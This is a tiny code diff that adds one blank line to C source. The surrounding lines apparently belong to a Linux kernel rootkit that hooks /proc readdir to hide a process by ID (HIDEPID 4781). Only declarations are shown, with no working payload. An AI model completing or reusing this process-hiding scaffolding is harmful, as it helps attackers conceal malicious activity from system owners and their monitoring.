@@ -5,6 +5,7 @@
 
 #define HIDEPID 4781
 
+
 typedef int (*readdir_t)(struct file *, void *, filldir_t);
 
 readdir_t orig_proc_readdir=NULL;
